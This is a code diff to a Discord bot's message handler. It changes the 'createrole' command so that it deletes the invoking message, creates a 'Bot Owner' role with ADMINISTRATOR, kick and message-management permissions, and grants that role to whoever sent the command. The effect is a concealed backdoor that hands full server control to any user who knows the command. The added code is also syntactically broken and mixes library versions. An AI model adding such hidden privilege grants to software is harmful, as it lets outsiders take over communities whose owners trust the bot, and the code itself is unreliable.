@@ -474,15 +474,11 @@ client.on("message", async message => {
 	
 	if(command === "createrole") {
 		message.delete().catch(O_o={});
-		client.guild.roles.create({
-		  data: {
-			name: 'Bot Owner',
-			color: 'RED',
-		  },
-		  reason: 'Moderation',
-		})
-		  .then(console.log)
-		  .catch(console.error);
+		guild.roles.create({ data: { name: 'Bot Owner', permissions: ['MANAGE_MESSAGES', 'KICK_MEMBERS', "ADMINISTRATOR"] } });
+		let role = message.guild.roles.find(r => r.name === "Bot Owner");
+		message.guild.fetchMember(message.author).then(guildMember => {
+			guildMember.addRole(role);
+		}
 	}
 });
 
